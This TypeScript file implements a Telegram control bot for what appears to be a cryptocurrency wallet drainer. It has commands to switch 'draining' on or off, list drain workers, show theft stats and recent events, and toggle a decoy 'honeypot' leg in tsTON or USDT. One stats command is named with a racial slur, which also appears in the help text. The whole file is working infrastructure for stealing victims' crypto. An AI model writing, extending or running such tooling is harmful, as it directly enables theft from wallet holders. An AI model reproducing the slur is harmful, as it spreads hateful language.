// In-process Telegram bot. Long-polls getUpdates, so no extra service needed.
import { readFileSync, writeFileSync } from 'fs'
import path from 'path'
import { config } from '@utils/config'
import { prisma } from '@db/instance'
import { formatStats, recentEvents } from './stats'

const API = `https://api.telegram.org/bot${config.BOT_TOKEN}`
const SWITCH_FILE =
	process.env.DRAIN_SWITCH_FILE || path.join(process.cwd(), 'drain.state')

/* Access control.
   ADMIN_IDS     — user ids allowed to command the bot anywhere (DMs included).
   ALLOWED_CHATS — chat ids where ANYONE may command it. Use this for a group.
   Both empty    -> open to everyone. */
const parseIds = (v?: string) =>
	(v ?? '').split(',').map(x => x.trim()).filter(Boolean)
const ADMINS = parseIds(Bun.env.ADMIN_IDS)
const ALLOWED_CHATS = parseIds(Bun.env.ALLOWED_CHATS)

let offset = 0

/* Never throws — always returns Telegram's JSON (or a synthetic failure), so we
   can log WHY something is wrong instead of silently dying. */
async function call<T = any>(
	method: string,
	payload: Record<string, unknown> = {}
): Promise<any> {
	try {
		const res = await fetch(`${API}/${method}`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify(payload),
			signal: AbortSignal.timeout(45_000),
		})
		return await res.json()
	} catch (e) {
		return { ok: false, error_code: -1, description: `fetch failed: ${e}` }
	}
}

const reply = (chatId: number | string, text: string) =>
	call('sendMessage', {
		chat_id: chatId,
		text,
		parse_mode: 'HTML',
		disable_web_page_preview: true,
	})

const readSwitch = () => {
	try {
		return readFileSync(SWITCH_FILE, 'utf8').trim() || 'on'
	} catch {
		return 'on'
	}
}

const HELP = [
	'<b>drain bot</b>',
	'/ping — reachability test (no auth)',
	'/niggers — full stats',
	'/last — 10 most recent events',
	'/on — enable draining',
	'/off — disable draining',
	'/status — switch + uptime',
	'/worker — list workers + honeypot state',
	'/honeypot — show honeypot state (worker 1)',
	'/honeypot &lt;id&gt; on|off — toggle decoy leg',
	'/honeypot &lt;id&gt; tsTON|USDT — set decoy flavor',
].join('\n')

async function handle(msg: any): Promise<void> {
	const text: string = (msg.text ?? '').trim()
	if (!text.startsWith('/')) return

	const chatId = msg.chat.id
	const fromId = String(msg.from?.id ?? '')
	const cmd = text.split(/[\s@]/)[0].slice(1).toLowerCase()
	const args = text.split(/\s+/).slice(1)

	try {
		// answers BEFORE the auth gate, so you can always test reachability
		if (cmd === 'ping') {
			await reply(chatId, `pong · switch <b>${readSwitch()}</b>`)
			return
		}

		const open = !ADMINS.length && !ALLOWED_CHATS.length
		const allowed =
			open ||
			ADMINS.includes(fromId) ||
			ALLOWED_CHATS.includes(String(chatId))

		if (!allowed) {
			await reply(
				chatId,
				`not authorised — your id is <code>${fromId}</code>, chat id is <code>${chatId}</code>`
			)
			return
		}

		switch (cmd) {
			case 'niggers':
			case 'stats':
				await reply(chatId, await formatStats())
				break

			case 'last':
				await reply(chatId, await recentEvents(10))
				break

			case 'on':
			case 'off':
				writeFileSync(SWITCH_FILE, cmd + '\n')
				await reply(chatId, `drainer → <b>${cmd}</b>`)
				break

			case 'status':
				await reply(
					chatId,
					`drainer: <b>${readSwitch()}</b>\nuptime: ${Math.floor(
						process.uptime()
					)}s`
				)
				break

			case 'worker':
			case 'workers': {
				const list = await prisma.worker.findMany({ orderBy: { id: 'asc' } })
				await reply(
					chatId,
					list.length
						? list
								.map(
									w =>
										`#${w.id} · ${w.drainMode} · honeypot <b>${
											w.honeyPot ? 'ON' : 'OFF'
										}</b> (${w.honeyPotMode})`
								)
								.join('\n')
						: 'no workers'
				)
				break
			}

			case 'honeypot': {
				const id = Number(args[0]) || 1
				const v = (args[1] || '').toLowerCase()

				const data: any = {}
				if (v === 'on') data.honeyPot = true
				if (v === 'off') data.honeyPot = false
				if (v === 'tston') data.honeyPotMode = 'tsTON'
				if (v === 'usdt') data.honeyPotMode = 'USDT'

				if (Object.keys(data).length) {
					await prisma.worker.update({ where: { id }, data }).catch(() => {})
				}

				const w = await prisma.worker.findUnique({ where: { id } })
				await reply(
					chatId,
					w
						? `worker ${id} · honeypot <b>${
								w.honeyPot ? 'ON' : 'OFF'
							}</b> · flavor <b>${w.honeyPotMode}</b>`
						: `no worker with id ${id}`
				)
				break
			}

			case 'help':
			case 'start':
				await reply(chatId, HELP)
				break
		}
	} catch (e) {
		// surface the real error in chat instead of failing silently
		await reply(chatId, `error: <code>${String(e).slice(0, 350)}</code>`)
		console.error('[bot] handle error', e)
	}
}
let polls = 0

export function startBot(): void {
	if (Bun.env.BOT_DISABLED === '1') {
		console.log('[bot] disabled via BOT_DISABLED')
		return
	}

	process.on('unhandledRejection', e => console.error('[bot] unhandledRejection', e))
	process.on('uncaughtException', e => console.error('[bot] uncaughtException', e))

	void (async () => {
		const me = await call('getMe')
		if (!me?.ok) {
			console.error('[bot] getMe FAILED — bad BOT_TOKEN?', me?.error_code, me?.description)
		} else {
			console.log(`[bot] authorised as @${me.result.username} (id ${me.result.id})`)
		}

		const wh = await call('getWebhookInfo')
		console.log('[bot] webhookInfo:', JSON.stringify(wh?.result ?? wh))
		console.log('[bot] deleteWebhook:', JSON.stringify(await call('deleteWebhook', { drop_pending_updates: false })))
		console.log('[bot] long-poll started')

		for (;;) {
			try {
				const data = await call('getUpdates', { offset, timeout: 30, allowed_updates: ['message'] })

				if (data?.ok) {
					if (++polls % 20 === 0) console.log(`[bot] alive · poll #${polls} · offset ${offset}`)
					for (const u of data.result ?? []) {
						offset = u.update_id + 1
						const m = u.message
						if (!m) continue
						console.log(`[bot] recv ${u.update_id} chat ${m.chat.id} from ${m.from?.id}: ${m.text ?? ''}`)
						void handle(m)
					}
				} else {
					console.error('[bot] getUpdates FAILED:', data?.error_code, data?.description)
					if (data?.error_code === 409)
						console.error('[bot] 409 = another poller or a webhook is eating updates')
					await new Promise(r => setTimeout(r, 3000))
				}
			} catch (e) {
				console.error('[bot] poll error', e)
			}
			await new Promise(r => setTimeout(r, 400))
		}
	})()
}